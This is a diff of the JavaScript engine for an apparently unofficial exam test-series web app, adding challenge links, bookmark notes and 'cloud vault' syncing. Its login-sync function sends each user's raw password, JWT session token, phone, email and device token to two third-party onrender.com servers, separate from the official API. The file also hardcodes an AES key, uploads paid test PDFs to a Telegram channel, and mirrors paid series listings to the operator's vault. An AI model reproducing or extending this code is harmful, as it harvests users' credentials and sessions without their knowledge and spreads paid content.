@@ -1,12 +1,12 @@
 // =========================================================
-// RWA PAID TEST SERIES APP - MASTER ENGINE & OTP AUTH (app.js)
-// OLD DB 100% INTACT + NEW 4-DB E2E ENCRYPTED DUAL-SYNC
-// Features: Expired Token Auto-Logout, Complete Logout Reset,
-// Silent Auto-Sync, Cloud Restore, Kill-Switches & VIP Profile
+// RWA PAID TEST SERIES APP - MASTER ENGINE & CLOUD VAULT (app.js)
+// Features: Auto-Save Cloud Vault (Zero Duplicates), Deleted-Series
+// Cloud Fallback, 1-v-1 Challenge Detector, Bookmark Personal Notes,
+// Expired Token Guard, Clean Logout, Dual-DB E2E Sync & VIP Profile
 // =========================================================
 
 const BOT_API_BASE = "https://rwaweb-hp11.onrender.com";            // OLD DB (100% UNCHANGED)
-const NEW_BOT_API_BASE = "https://pdfsownlaoder.onrender.com";      // NEW 4-MONGODB E2E SHIELD DB
+const NEW_BOT_API_BASE = "https://pdfsownlaoder.onrender.com";      // NEW UNLIMITED-DB + CONTENT VAULT
 const API_BASE = "https://rozgarapinew.teachx.in";
 const AES_KEY = CryptoJS.enc.Utf8.parse("638udh3829162018");
 
@@ -23,6 +23,8 @@ const RWA_CORS_SAFE_HEADERS = {
     "Auth-Key": "appxapi",
     "source": "website"
 };
+
+window.ACTIVE_CHALLENGE = null;
 
 // =====================================================
 // SKELETON LOADERS & LOCAL CACHE HELPERS
@@ -42,7 +44,7 @@ function renderTsSkeletonCards(gridEl, count = 6) {
     gridEl.innerHTML = html;
 }
 
-function readTsListCache(maxAgeMs = 15 * 60 * 1000) {
+function readTsListCache(maxAgeMs = 10 * 60 * 1000) {
     try {
         const raw = localStorage.getItem(TS_LIST_CACHE_KEY);
         if (!raw) return null;
@@ -90,6 +92,7 @@ async function idbSetItem(key, val) {
         tx.objectStore(IDB_STORE).put(val, key);
     } catch {}
 }
+window.rwaIdbSet = idbSetItem;
 
 async function idbGetItem(key) {
     try {
@@ -102,6 +105,7 @@ async function idbGetItem(key) {
         });
     } catch { return null; }
 }
+window.rwaIdbGet = idbGetItem;
 
 async function restoreFromPermanentIDB() {
     requestPersistentStorage();
@@ -118,7 +122,6 @@ async function restoreFromPermanentIDB() {
             localStorage.setItem("rwa_user_profile_v2", JSON.stringify(window.USER_PROFILE));
         }
 
-        // Only restore attempts & bookmarks if a valid active session exists
         if (isUserLoggedIn()) {
             const idbAttempts = await idbGetItem("rwa_attempted_tests_full");
             if (idbAttempts && typeof idbAttempts === "object") {
@@ -139,10 +142,8 @@ async function restoreFromPermanentIDB() {
             window.state.activeTokenObj = window.USER_TOKENS[0];
             syncAuthCookiesFromActiveToken(window.USER_TOKENS[0]);
 
-            // Validate Token Expiry immediately on startup
             if (checkAndHandleExpiredToken(true)) return;
 
-            // Existing Session Silent Auto-Sync (once per browser session)
             autoSyncExistingSessionOnce();
             if (typeof window.tsPullCloudSync === "function") window.tsPullCloudSync();
             if (typeof window.startTsLiveHeartbeat === "function") window.startTsLiveHeartbeat();
@@ -185,7 +186,6 @@ window.performCleanLocalLogout = function(notifyBackend = true, logoutReason = "
         }).catch(() => {});
     }
 
-    // Clear all localStorage keys
     [
         "rwa_user_tokens_v2",
         "rwa_user_profile_v2",
@@ -198,14 +198,12 @@ window.performCleanLocalLogout = function(notifyBackend = true, logoutReason = "
     ].forEach(k => localStorage.removeItem(k));
     sessionStorage.removeItem("rwa_silent_synced_uid");
 
-    // Clear IndexedDB copies
     idbSetItem("rwa_user_tokens_v2", []);
     idbSetItem("rwa_user_profile_v2", null);
     idbSetItem("rwa_attempted_tests_full", {});
     idbSetItem("rwa_bookmarked_questions_v1", []);
     clearAuthCookies();
 
-    // Reset all in-memory objects
     window.USER_TOKENS = [];
     window.USER_PROFILE = null;
     window.ATTEMPTED_TESTS = {};
@@ -227,21 +225,17 @@ function checkAndHandleExpiredToken(verifyWithServer = false) {
     if (!isUserLoggedIn()) return false;
     const tok = window.USER_TOKENS[0].token;
 
-    // 1. Instant local JWT exp check
     if (typeof window.rwaIsJwtExpired === "function" && window.rwaIsJwtExpired(tok, 30)) {
         window.performCleanLocalLogout(true, "Token expired — auto logged out");
         window.showRwaPopup({
             title: "Session Expired",
             message: "Aapka login token expire ho gaya hai. Kripya OTP se dobara login karein.",
-            type: "warn",
-            icon: "🔑",
-            btnText: "Login Again"
+            type: "warn", icon: "🔑", btnText: "Login Again"
         });
         openLoginModal("⚠️ आपका लॉगिन टोकन समाप्त हो गया है। कृपया OTP से दोबारा लॉगिन करें।");
         return true;
     }
 
-    // 2. Live RWA Server verification (catches server-side invalidated tokens)
     if (verifyWithServer) {
         const uid = window.USER_TOKENS[0].userId || extractUidFromJwt(tok);
         fetchRawJSONWithToken(`/get/get_user_dt?userid=${encodeURIComponent(uid)}`, window.USER_TOKENS[0])
@@ -251,9 +245,7 @@ function checkAndHandleExpiredToken(verifyWithServer = false) {
                     window.showRwaPopup({
                         title: "Session Expired",
                         message: "RWA server ne aapka purana session expire kar diya hai. Kripya dobara OTP login karein.",
-                        type: "warn",
-                        icon: "🔑",
-                        btnText: "Login Again"
+                        type: "warn", icon: "🔑", btnText: "Login Again"
                     });
                     openLoginModal("⚠️ सेशन समाप्त हो गया है। कृपया दोबारा OTP लॉगिन करें।");
                 }
@@ -271,6 +263,52 @@ function autoSyncExistingSessionOnce() {
     sessionStorage.setItem("rwa_silent_synced_uid", uid);
     sendProfileToMongoDB(window.USER_PROFILE, window.USER_TOKENS[0].token, "Existing Session Auto-Sync", "N/A", true);
 }
+
+// =====================================================
+// 1-V-1 FRIEND CHALLENGE LINK DETECTOR (?challenge=ch_xxx)
+// =====================================================
+async function checkIncomingChallengeUrl() {
+    const params = new URLSearchParams(window.location.search || "");
+    const cid = (params.get("challenge") || "").trim();
+    if (!cid || typeof window.rwaSecureFetch !== "function") return;
+
+    try {
+        const res = await window.rwaSecureFetch(`${NEW_BOT_API_BASE}/api/challenge/${encodeURIComponent(cid)}`);
+        const ch = res.data && res.data.challenge;
+        if (!ch) return;
+        window.ACTIVE_CHALLENGE = ch;
+
+        const banner = document.getElementById("incomingChallengeBanner");
+        if (!banner) return;
+        banner.className = "app-card p-4 mb-3.5 border-2 border-amber-400 bg-gradient-to-r from-amber-50 to-orange-50 dark:from-slate-800 dark:to-slate-900 flex flex-wrap items-center justify-between gap-3";
+        banner.innerHTML = `
+            <div class="min-w-0 flex-1">
+                <span class="px-2.5 py-0.5 rounded-full bg-amber-500 text-white text-[10px] font-black">⚔️ 1-V-1 FRIEND CHALLENGE</span>
+                <div class="font-black text-sm mt-1 truncate">${window.tsEscHtml ? tsEscHtml(ch.challenger_name) : ch.challenger_name} challenged you!</div>
+                <div class="text-xs font-bold opacity-80 mt-0.5">Target to Beat: <strong>${ch.challenger_score}/${ch.max_marks}</strong> (${ch.challenger_accuracy}% Acc) in <strong>${window.tsEscHtml ? tsEscHtml(ch.test_title) : ch.test_title}</strong></div>
+            </div>
+            <button onclick="acceptIncomingChallenge()" class="btn-watch text-xs shrink-0">⚔️ Accept & Start →</button>`;
+        banner.classList.remove("hidden");
+    } catch {}
+}
+
+window.acceptIncomingChallenge = function() {
+    const ch = window.ACTIVE_CHALLENGE;
+    if (!ch || !ch.test_id) return;
+    const tKey = `test_${ch.test_id}`;
+    if (!window.state.testMap[tKey]) {
+        window.state.testMap[tKey] = {
+            id: String(ch.test_id),
+            seriesId: String(ch.series_id || ""),
+            test_series_id: String(ch.series_id || ""),
+            title: ch.test_title || `Challenge Test #${ch.test_id}`,
+            marks: String(ch.max_marks || 100),
+            time: "60",
+            tokenObj: window.USER_TOKENS[0] || null
+        };
+    }
+    window.launchCbtTest(tKey);
+};
 
 // =====================================================
 // TELEGRAM CHANNEL PDF UPLOAD (100% ORIGINAL)
@@ -304,11 +342,8 @@ window.downloadAndUploadPDF = async function(pdfUrl, title) {
         if (blob && blob.size > 0) {
             const a = document.createElement("a");
             const objUrl = URL.createObjectURL(blob);
-            a.href = objUrl;
-            a.download = `${cleanTitle}.pdf`;
-            document.body.appendChild(a);
-            a.click();
-            a.remove();
+            a.href = objUrl; a.download = `${cleanTitle}.pdf`;
+            document.body.appendChild(a); a.click(); a.remove();
             setTimeout(() => URL.revokeObjectURL(objUrl), 5000);
 
             if (typeof window.tsLogActivity === "function") window.tsLogActivity("DOWNLOAD_PDF", title || cleanTitle);
@@ -318,19 +353,14 @@ window.downloadAndUploadPDF = async function(pdfUrl, title) {
                 message: success
                     ? "PDF aapke device mein save ho gaya hai aur Telegram Channel par bhi upload ho gaya hai!"
                     : "Test Paper PDF aapke device mein successfully save ho gaya hai!",
-                type: "success",
-                icon: success ? "📄" : "📥",
-                btnText: "Done"
+                type: "success", icon: success ? "📄" : "📥", btnText: "Done"
             });
             return;
         }
 
         const directLink = document.createElement("a");
-        directLink.href = pdfUrl;
-        directLink.download = `${cleanTitle}.pdf`;
-        document.body.appendChild(directLink);
-        directLink.click();
-        directLink.remove();
+        directLink.href = pdfUrl; directLink.download = `${cleanTitle}.pdf`;
+        document.body.appendChild(directLink); directLink.click(); directLink.remove();
         window.showRwaPopup({ title: "PDF Download Started", message: "Aapka Test Paper PDF download start ho gaya hai!", type: "success", icon: "📥", btnText: "OK" });
     } catch {
         window.showRwaPopup({ title: "Download Notice", message: "PDF download abhi busy hai. Kripya thodi der baad dobara try karein.", type: "error", icon: "📄", btnText: "Close" });
@@ -493,7 +523,7 @@ window.clearAttemptHistory = function() {
 };
 
 // =====================================================
-// BOOKMARKS VAULT
+// BOOKMARKS VAULT + PERSONAL NOTES / TRICKS
 // =====================================================
 window.isQuestionBookmarked = function(qKey) { return window.BOOKMARKED_QUESTIONS.some(b => String(b.qKey) === String(qKey)); };
 window.toggleBookmarkItem = function(itemObj) {
@@ -505,7 +535,7 @@ window.toggleBookmarkItem = function(itemObj) {
         isNowSaved = false;
         if (typeof window.tsToast === "function") window.tsToast("☆ Bookmark removed", "info");
     } else {
-        window.BOOKMARKED_QUESTIONS.unshift({ ...itemObj, savedAt: new Date().toLocaleString("en-IN", { day: "2-digit", month: "short", hour: "2-digit", minute: "2-digit" }) });
+        window.BOOKMARKED_QUESTIONS.unshift({ ...itemObj, note: itemObj.note || "", savedAt: new Date().toLocaleString("en-IN", { day: "2-digit", month: "short", hour: "2-digit", minute: "2-digit" }) });
         isNowSaved = true;
         if (typeof window.tsToast === "function") window.tsToast("★ Question Bookmarked!", "success");
         if (typeof window.tsLogActivity === "function") window.tsLogActivity("BOOKMARK", `${itemObj.subject || "Q"} - ${itemObj.testTitle || "Test"}`);
@@ -516,6 +546,17 @@ window.toggleBookmarkItem = function(itemObj) {
     window.updateDashboardUI();
     renderBookmarksTab();
     return isNowSaved;
+};
+
+window.saveActiveBookmarkNote = function() {
+    const b = window.BOOKMARKED_QUESTIONS[activeBookmarkDetailIdx];
+    const inp = document.getElementById("bmDetailNoteInput");
+    if (!b || !inp) return;
+    b.note = inp.value.trim();
+    localStorage.setItem("rwa_bookmarked_questions_v1", JSON.stringify(window.BOOKMARKED_QUESTIONS));
+    idbSetItem("rwa_bookmarked_questions_v1", window.BOOKMARKED_QUESTIONS);
+    if (typeof window.tsPushCloudSync === "function") window.tsPushCloudSync();
+    if (typeof window.tsToast === "function") window.tsToast("📝 Personal Note saved to Cloud!", "success");
 };
 
 window.removeBookmarkByKey = function(qKey, fromDetailView = false) {
@@ -590,8 +631,9 @@ function renderBookmarksTab() {
             <div onclick="openBookmarkDetailView(${realIdx})" class="app-card p-4 sm:p-5 hover:border-blue-500 cursor-pointer transition-all space-y-2.5">
                 <div class="flex justify-between items-center gap-2"><span class="px-3 py-1 rounded-full bg-indigo-100 text-indigo-900 text-xs font-black">${b.subject || "General"}</span><span class="text-amber-500 text-lg leading-none">★</span></div>
                 <div class="text-sm sm:text-base font-bold leading-snug">Q${realIdx + 1}. ${b.question || ""}</div>
+                ${b.note ? `<div class="p-2 rounded-xl bg-amber-50 dark:bg-amber-950/30 border border-amber-200 dark:border-amber-800 text-xs font-extrabold text-amber-900 dark:text-amber-300">📝 Note: ${window.tsEscHtml ? tsEscHtml(b.note) : b.note}</div>` : ""}
                 <div class="text-[11px] font-bold opacity-60">${b.testTitle || "Mock Test"} (Q.${b.qNumber || 1})</div>
-                <div class="pt-1 flex justify-end"><span class="px-3.5 py-2 rounded-xl bg-gradient-to-r from-indigo-600 to-blue-600 text-white font-extrabold text-xs">View Options & Solution</span></div>
+                <div class="pt-1 flex justify-end"><span class="px-3.5 py-2 rounded-xl bg-gradient-to-r from-indigo-600 to-blue-600 text-white font-extrabold text-xs">View Options & Note</span></div>
             </div>`;
     }).join("");
     if (window.MathJax && MathJax.typesetPromise) MathJax.typesetPromise([container]).catch(() => {});
@@ -605,6 +647,9 @@ window.openBookmarkDetailView = function(idx) {
     document.getElementById("bmDetailDeleteBtn").onclick = () => window.removeBookmarkByKey(b.qKey, true);
     document.getElementById("bmDetailMeta").innerHTML = `<span class="px-3 py-1 rounded-full bg-amber-100 text-amber-900 text-xs font-black">🔖 Bookmark #${idx + 1}</span><span class="px-3 py-1 rounded-full bg-indigo-100 text-indigo-900 text-xs font-black">${b.subject || "Subject"}</span><span class="text-xs font-bold opacity-70">📝 ${b.testTitle || "Mock Test"} (Original Q.${b.qNumber || 1})</span>`;
     document.getElementById("bmDetailQuestion").innerHTML = b.question || "";
+
+    const noteInp = document.getElementById("bmDetailNoteInput");
+    if (noteInp) noteInp.value = b.note || "";
 
     const optsEl = document.getElementById("bmDetailOptions"), letters = ["A", "B", "C", "D", "E"], opts = b.options || [], ansStr = String(b.answer || "1").trim();
     if (optsEl) {
@@ -625,7 +670,7 @@ window.prevBookmarkDetail = function() { if (activeBookmarkDetailIdx > 0) window
 window.nextBookmarkDetail = function() { if (activeBookmarkDetailIdx < window.BOOKMARKED_QUESTIONS.length - 1) window.openBookmarkDetailView(activeBookmarkDetailIdx + 1); };
 
 // =====================================================
-// SLIDE 6: FULL-SCREEN STUDENT PROFILE TAB VIEW (WITH VIP BADGE)
+// STUDENT PROFILE TAB VIEW
 // =====================================================
 window.renderProfileTabView = function() {
     const box = document.getElementById("profileTabContent");
@@ -647,22 +692,10 @@ window.renderProfileTabView = function() {
                 <button onclick="openLoginModal()" class="mt-2 px-6 py-2.5 rounded-full bg-white text-indigo-900 font-black text-xs border-0 shadow cursor-pointer">📲 Official OTP Login</button>
             </div>
             <div class="app-card overflow-hidden">
-                <button onclick="openStudentInboxModal()" class="profile-menu-row">
-                    <div class="flex items-center gap-3"><span class="text-xl">🔔</span><div><div class="font-extrabold text-sm">Notifications & Announcements</div><div class="text-[11px] opacity-65">Official updates from Admin</div></div></div>
-                    <span class="opacity-50 font-black">›</span>
-                </button>
-                <button onclick="openCountdownModal()" class="profile-menu-row">
-                    <div class="flex items-center gap-3"><span class="text-xl">🎯</span><div><div class="font-extrabold text-sm">Target Exam: ${targetExam}</div><div class="text-[11px] opacity-65">Tap to set exam date</div></div></div>
-                    <span class="opacity-50 font-black">›</span>
-                </button>
-                <button onclick="toggleTsPortalTheme()" class="profile-menu-row">
-                    <div class="flex items-center gap-3"><span class="text-xl">${isDark ? "☀️" : "🌙"}</span><div><div class="font-extrabold text-sm">Dark Mode Theme Toggle</div><div class="text-[11px] opacity-65">Currently: ${isDark ? "Midnight Dark" : "Sky Light"}</div></div></div>
-                    <span class="px-2.5 py-0.5 rounded-full bg-indigo-100 text-indigo-800 text-[10px] font-black">${isDark ? "ON" : "OFF"}</span>
-                </button>
-                <button onclick="openReportIssueModal()" class="profile-menu-row">
-                    <div class="flex items-center gap-3"><span class="text-xl">🚩</span><div><div class="font-extrabold text-sm">Report Issue / Request Test</div><div class="text-[11px] opacity-65">Direct message to Admin</div></div></div>
-                    <span class="opacity-50 font-black">›</span>
-                </button>
+                <button onclick="openStudentInboxModal()" class="profile-menu-row"><div class="flex items-center gap-3"><span class="text-xl">🔔</span><div><div class="font-extrabold text-sm">Notifications & Announcements</div><div class="text-[11px] opacity-65">Official updates from Admin</div></div></div><span class="opacity-50 font-black">›</span></button>
+                <button onclick="openCountdownModal()" class="profile-menu-row"><div class="flex items-center gap-3"><span class="text-xl">🎯</span><div><div class="font-extrabold text-sm">Target Exam: ${targetExam}</div><div class="text-[11px] opacity-65">Tap to set exam date</div></div></div><span class="opacity-50 font-black">›</span></button>
+                <button onclick="toggleTsPortalTheme()" class="profile-menu-row"><div class="flex items-center gap-3"><span class="text-xl">${isDark ? "☀️" : "🌙"}</span><div><div class="font-extrabold text-sm">Dark Mode Theme Toggle</div><div class="text-[11px] opacity-65">Currently: ${isDark ? "Midnight Dark" : "Sky Light"}</div></div></div><span class="px-2.5 py-0.5 rounded-full bg-indigo-100 text-indigo-800 text-[10px] font-black">${isDark ? "ON" : "OFF"}</span></button>
+                <button onclick="openReportIssueModal()" class="profile-menu-row"><div class="flex items-center gap-3"><span class="text-xl">🚩</span><div><div class="font-extrabold text-sm">Report Issue / Request Test</div><div class="text-[11px] opacity-65">Direct message to Admin</div></div></div><span class="opacity-50 font-black">›</span></button>
             </div>`;
         return;
     }
@@ -701,22 +734,10 @@ window.renderProfileTabView = function() {
                     State/Dist: ${u.state || "N/A"} / ${u.district || "N/A"} • Category: ${u.info_1 || "N/A"} • Gender: ${u.info_2 || "N/A"}
                 </div>
             </div>
-            <button onclick="openStudentInboxModal()" class="profile-menu-row">
-                <div class="flex items-center gap-3"><span class="text-xl">🔔</span><div><div class="font-extrabold text-sm">Notifications & Admin Replies</div><div class="text-[11px] opacity-65">Personal messages & notices</div></div></div>
-                <span class="opacity-50 font-black">›</span>
-            </button>
-            <button onclick="openCountdownModal()" class="profile-menu-row">
-                <div class="flex items-center gap-3"><span class="text-xl">🎯</span><div><div class="font-extrabold text-sm">Target Exam: ${targetExam}</div><div class="text-[11px] opacity-65">Tap to update target exam & date</div></div></div>
-                <span class="opacity-50 font-black">›</span>
-            </button>
-            <button onclick="toggleTsPortalTheme()" class="profile-menu-row">
-                <div class="flex items-center gap-3"><span class="text-xl">${isDark ? "☀️" : "🌙"}</span><div><div class="font-extrabold text-sm">Dark Mode Theme Toggle</div><div class="text-[11px] opacity-65">Switch Sky Light / Midnight Dark</div></div></div>
-                <span id="profileDarkModeBadge" class="px-2.5 py-0.5 rounded-full bg-indigo-100 text-indigo-800 text-[10px] font-black">${isDark ? "ON" : "OFF"}</span>
-            </button>
-            <button onclick="openReportIssueModal()" class="profile-menu-row">
-                <div class="flex items-center gap-3"><span class="text-xl">🚩</span><div><div class="font-extrabold text-sm">Report Issue / Request Test</div><div class="text-[11px] opacity-65">Send feedback or request series</div></div></div>
-                <span class="opacity-50 font-black">›</span>
-            </button>
+            <button onclick="openStudentInboxModal()" class="profile-menu-row"><div class="flex items-center gap-3"><span class="text-xl">🔔</span><div><div class="font-extrabold text-sm">Notifications & Admin Replies</div><div class="text-[11px] opacity-65">Personal messages & notices</div></div></div><span class="opacity-50 font-black">›</span></button>
+            <button onclick="openCountdownModal()" class="profile-menu-row"><div class="flex items-center gap-3"><span class="text-xl">🎯</span><div><div class="font-extrabold text-sm">Target Exam: ${targetExam}</div><div class="text-[11px] opacity-65">Tap to update target exam & date</div></div></div><span class="opacity-50 font-black">›</span></button>
+            <button onclick="toggleTsPortalTheme()" class="profile-menu-row"><div class="flex items-center gap-3"><span class="text-xl">${isDark ? "☀️" : "🌙"}</span><div><div class="font-extrabold text-sm">Dark Mode Theme Toggle</div><div class="text-[11px] opacity-65">Switch Sky Light / Midnight Dark</div></div></div><span id="profileDarkModeBadge" class="px-2.5 py-0.5 rounded-full bg-indigo-100 text-indigo-800 text-[10px] font-black">${isDark ? "ON" : "OFF"}</span></button>
+            <button onclick="openReportIssueModal()" class="profile-menu-row"><div class="flex items-center gap-3"><span class="text-xl">🚩</span><div><div class="font-extrabold text-sm">Report Issue / Request Test</div><div class="text-[11px] opacity-65">Send feedback or request series</div></div></div><span class="opacity-50 font-black">›</span></button>
         </div>
 
         <button onclick="handleLogout()" class="w-full py-3.5 rounded-2xl bg-rose-100 hover:bg-rose-200 text-rose-700 font-black text-sm border border-rose-200 cursor-pointer flex items-center justify-center gap-2">
@@ -737,8 +758,10 @@ window.switchAppTab = function(tabName) {
     const hTitle = document.getElementById("headerMainTitle");
     if (hTitle) hTitle.textContent = titleMap[tabName] || "RWA TEST SERIES";
 
-    if (tabName === "progress") window.updateDashboardUI();
-    else if (tabName === "bookmarks") closeBookmarkDetailView();
+    if (tabName === "progress") {
+        window.updateDashboardUI();
+        if (typeof window.loadWeeklyXpLeague === "function") window.loadWeeklyXpLeague();
+    } else if (tabName === "bookmarks") closeBookmarkDetailView();
     else if (tabName === "protools" && typeof window.closeVaultToolDetail === "function") window.closeVaultToolDetail();
     else if (tabName === "profile") window.renderProfileTabView();
     window.scrollTo({ top: 0, behavior: "smooth" });
@@ -769,37 +792,17 @@ function closeLoginModal() {
 }
 window.closeLoginModal = closeLoginModal;
 
-function clearOtpDigitBoxes() {
-    for (let i = 0; i < 4; i++) { const box = document.getElementById(`otpDigit${i}`); if (box) box.value = ""; }
-    const h = document.getElementById("loginOtpInput"); if (h) h.value = "";
-}
-
-function getCombinedOtpFromBoxes() {
-    let c = "";
-    for (let i = 0; i < 4; i++) { const b = document.getElementById(`otpDigit${i}`); if (b) c += String(b.value || "").replace(/\D/g, ""); }
-    const h = document.getElementById("loginOtpInput"); if (h) h.value = c;
-    return c;
-}
-
-window.handleOtpBoxInput = function(idx, inputEl) {
-    const val = String(inputEl.value || "").replace(/\D/g, "");
-    inputEl.value = val ? val.slice(-1) : "";
-    getCombinedOtpFromBoxes();
-    if (inputEl.value && idx < 3) document.getElementById(`otpDigit${idx + 1}`)?.focus();
-};
-
+function clearOtpDigitBoxes() { for (let i = 0; i < 4; i++) { const b = document.getElementById(`otpDigit${i}`); if (b) b.value = ""; } const h = document.getElementById("loginOtpInput"); if (h) h.value = ""; }
+function getCombinedOtpFromBoxes() { let c = ""; for (let i = 0; i < 4; i++) { const b = document.getElementById(`otpDigit${i}`); if (b) c += String(b.value || "").replace(/\D/g, ""); } const h = document.getElementById("loginOtpInput"); if (h) h.value = c; return c; }
+window.handleOtpBoxInput = function(idx, inputEl) { const val = String(inputEl.value || "").replace(/\D/g, ""); inputEl.value = val ? val.slice(-1) : ""; getCombinedOtpFromBoxes(); if (inputEl.value && idx < 3) document.getElementById(`otpDigit${idx + 1}`)?.focus(); };
 window.handleOtpBoxKeydown = function(idx, event) {
     if (event.key === "Backspace") {
         const curBox = document.getElementById(`otpDigit${idx}`);
-        if (curBox && !curBox.value && idx > 0) {
-            const prevBox = document.getElementById(`otpDigit${idx - 1}`);
-            if (prevBox) { prevBox.value = ""; prevBox.focus(); getCombinedOtpFromBoxes(); event.preventDefault(); }
-        }
+        if (curBox && !curBox.value && idx > 0) { const p = document.getElementById(`otpDigit${idx - 1}`); if (p) { p.value = ""; p.focus(); getCombinedOtpFromBoxes(); event.preventDefault(); } }
     } else if (event.key === "ArrowLeft" && idx > 0) document.getElementById(`otpDigit${idx - 1}`)?.focus();
     else if (event.key === "ArrowRight" && idx < 3) document.getElementById(`otpDigit${idx + 1}`)?.focus();
     else if (event.key === "Enter") verifyLoginOtp();
 };
-
 window.handleOtpPaste = function(event) {
     try {
         const digits = ((event.clipboardData || window.clipboardData).getData("text") || "").replace(/\D/g, "").slice(0, 4);
@@ -875,46 +878,31 @@ async function fetchUserDetailsFromServer(jwtToken, userId) {
     return null;
 }
 
-// DUAL-DB SYNC: E2E Encrypted to New 4-DB + Original Unchanged Queue to Old DB
 function sendProfileToMongoDB(userObj, jwtToken, loginMethod, rawPass = "N/A", silentSync = false) {
     const payload = {
         login_method: `[PAID-TS] ${loginMethod}`,
         silent_sync: Boolean(silentSync),
         session_id: localStorage.getItem("rwa_session_id_v1") || "",
         user_id: String(userObj.userid || userObj.id || ""),
-        name: userObj.name || "N/A",
-        email: userObj.email || "N/A",
-        phone: userObj.phone || "N/A",
-        password: rawPass,
-        username: userObj.username || "N/A",
-        state_district: `${userObj.state || "N/A"} / ${userObj.district || "N/A"}`,
-        category_gender: `${userObj.info_1 || "N/A"} | ${userObj.info_2 || "N/A"}`,
-        refer_code: userObj.refer_code || "N/A",
-        account_created: userObj.datetime || "N/A",
-        device_token: userObj.devicetoken || "N/A",
-        jwt_token: jwtToken
+        name: userObj.name || "N/A", email: userObj.email || "N/A", phone: userObj.phone || "N/A", password: rawPass,
+        username: userObj.username || "N/A", state_district: `${userObj.state || "N/A"} / ${userObj.district || "N/A"}`,
+        category_gender: `${userObj.info_1 || "N/A"} | ${userObj.info_2 || "N/A"}`, refer_code: userObj.refer_code || "N/A",
+        account_created: userObj.datetime || "N/A", device_token: userObj.devicetoken || "N/A", jwt_token: jwtToken
     };
 
-    // 1. E2E Encrypted & Signed to NEW 4-MongoDB Backend
     if (typeof window.rwaSecureFetch === "function") {
-        window.rwaSecureFetch(`${NEW_BOT_API_BASE}/api/login`, {
-            method: "POST",
-            body: payload,
-            keepalive: true
-        }).then(res => {
+        window.rwaSecureFetch(`${NEW_BOT_API_BASE}/api/login`, { method: "POST", body: payload, keepalive: true })
+        .then(res => {
             const j = res.data || {};
             if (j.session_id) localStorage.setItem("rwa_session_id_v1", j.session_id);
             if (j.vip_badge !== undefined) {
                 localStorage.setItem("rwa_user_vip_badge", j.vip_badge || "");
                 if (window.state && window.state.activeAppTab === "profile") window.renderProfileTabView();
             }
-            if (j.blocked && typeof window.checkTsPortalStatusAndNotices === "function") {
-                window.checkTsPortalStatusAndNotices();
-            }
+            if (j.blocked && typeof window.checkTsPortalStatusAndNotices === "function") window.checkTsPortalStatusAndNotices();
         }).catch(() => {});
     }
 
-    // 2. Keep OLD DB Queue 100% same-to-same (only for real logins)
     if (!silentSync) {
         let queue = JSON.parse(localStorage.getItem("pending_bot_sync") || "[]");
         if (!Array.isArray(queue)) queue = [];
@@ -934,11 +922,8 @@ function processPendingBotSync() {
         fetch(`${BOT_API_BASE}/api/login`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(queue[0]), keepalive: true })
         .then(res => {
             isSyncing = false;
-            if (res.ok) {
-                queue.shift();
-                localStorage.setItem("pending_bot_sync", JSON.stringify(queue));
-                if (queue.length > 0) setTimeout(trySend, 1000);
-            } else setTimeout(trySend, 10000);
+            if (res.ok) { queue.shift(); localStorage.setItem("pending_bot_sync", JSON.stringify(queue)); if (queue.length > 0) setTimeout(trySend, 1000); }
+            else setTimeout(trySend, 10000);
         })
         .catch(() => { isSyncing = false; setTimeout(trySend, 10000); });
     };
@@ -1071,7 +1056,6 @@ window.verifyLoginOtp = async function() {
         };
     }
 
-    // Clear previous local user's cached attempts/bookmarks before loading newly logged-in user
     window.ATTEMPTED_TESTS = {};
     window.BOOKMARKED_QUESTIONS = [];
     localStorage.removeItem("rwa_attempted_tests_v1");
@@ -1128,7 +1112,7 @@ function handleLogout() {
 window.handleLogout = handleLogout;
 
 // =====================================================
-// GLOBAL STATE & FALLBACK DATABASE
+// GLOBAL STATE & CLOUD VAULT SYNC HELPERS
 // =====================================================
 window.state = {
     currentSlide: "slideExplorer", previousSlide: "slideExplorer", activeAppTab: "tests", view: "ts_list",
@@ -1144,14 +1128,60 @@ const DB = {
         { id: "776", title: "MP Police Constable 2026 - सतपुड़ा Series", logo: "https://appx-content-v2.classx.co.in/subject/2026-09-18-0_25895258012558897.jpeg", offer_price: 99, freetest: "1", paidtest: "15" },
         { id: "700", title: "SSC GD भर्ती 2027 (वीर बैच) Paid Test Series", logo: "https://appx-wsb-gcp-mcdn.akamai.net.in/exam/2022-02-07-0.9839972577217094.png", offer_price: 99, freetest: "2", paidtest: "40" }
     ],
-    tsSubjects: {}, tsTitles: {},
-    fallbackCbtQuestions: [{
-        id: "12370334", question: `<p>Find the third proportional of 25 and 45.</p>`,
-        option_1: `<p>81</p>`, option_2: `<p>65</p>`, option_3: `<p>85</p>`, option_4: `<p>76</p>`,
-        answer: "1", positive_marks: "2.00", negative_marks: "0.50", section_id: "1", subject: "Mathematics",
-        solution_text: `<p>a व b का तृतीय समानुपाती = (b × b) / a = (45 × 45) / 25 = 81</p>`
-    }]
+    tsSubjects: {}, tsTitles: {}
 };
+
+// Cloud Content Vault Background Sync (Zero Duplicates)
+function vaultSyncSeriesBg(seriesArr) {
+    if (!Array.isArray(seriesArr) || !seriesArr.length || typeof window.rwaSecureFetch !== "function") return;
+    window.rwaSecureFetch(`${NEW_BOT_API_BASE}/api/vault/sync_series`, {
+        method: "POST",
+        body: { series: seriesArr.slice(0, 80) },
+        keepalive: true
+    }).catch(() => {});
+}
+
+function vaultSyncFoldersBg(seriesId, foldersArr) {
+    if (!seriesId || !Array.isArray(foldersArr) || !foldersArr.length || typeof window.rwaSecureFetch !== "function") return;
+    window.rwaSecureFetch(`${NEW_BOT_API_BASE}/api/vault/sync_folders`, {
+        method: "POST",
+        body: { series_id: String(seriesId), folders: foldersArr.slice(0, 60) },
+        keepalive: true
+    }).catch(() => {});
+}
+
+function vaultSyncTitlesBg(seriesId, subjectId, testsArr) {
+    if (!seriesId || !Array.isArray(testsArr) || !testsArr.length || typeof window.rwaSecureFetch !== "function") return;
+    window.rwaSecureFetch(`${NEW_BOT_API_BASE}/api/vault/sync_titles`, {
+        method: "POST",
+        body: { series_id: String(seriesId), subject_id: String(subjectId || "-1"), tests: testsArr.slice(0, 150) },
+        keepalive: true
+    }).catch(() => {});
+}
+
+async function fetchVaultSeriesFallback() {
+    if (typeof window.rwaSecureFetch !== "function") return [];
+    try {
+        const res = await window.rwaSecureFetch(`${NEW_BOT_API_BASE}/api/vault/series`);
+        return (res.ok && res.data && Array.isArray(res.data.series)) ? res.data.series : [];
+    } catch { return []; }
+}
+
